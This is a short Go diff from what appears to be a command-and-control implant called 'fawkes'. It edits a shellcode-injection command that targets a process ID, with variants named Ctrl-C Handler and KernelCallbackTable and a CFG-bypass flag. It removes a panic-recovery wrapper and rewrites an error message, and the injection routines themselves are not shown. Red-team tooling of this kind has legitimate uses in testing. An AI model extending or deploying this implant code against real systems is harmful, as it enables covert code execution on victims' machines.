@@ -20,7 +20,6 @@ import (
 	"encoding/base64"
 	"fmt"
 	"runtime"
-	"runtime/debug"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -137,21 +136,14 @@ func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult 
 	}
 
 	var output string
-	func() {
-		defer func() {
-			if r := recover(); r != nil {
-				err = fmt.Errorf("PANIC: %v\n%s", r, debug.Stack())
-			}
-		}()
-		switch params.Variant {
-		case 1:
-			output, err = executeOpusVariant1(shellcode, uint32(params.PID), params.CFGBypass)
-		case 4:
-			output, err = executeOpusVariant4(shellcode, uint32(params.PID), params.CFGBypass)
-		default:
-			err = fmt.Errorf("unsupported variant %d", params.Variant)
-		}
-	}()
+	switch params.Variant {
+	case 1:
+		output, err = executeOpusVariant1(shellcode, uint32(params.PID), params.CFGBypass)
+	case 4:
+		output, err = executeOpusVariant4(shellcode, uint32(params.PID), params.CFGBypass)
+	default:
+		return errorf("Error: Unsupported variant %d. Currently supported: 1 (Ctrl-C Handler), 4 (KernelCallbackTable)", params.Variant)
+	}
 
 	if err != nil {
 		return errorResult(output + fmt.Sprintf("\n[!] Injection failed: %v", err))
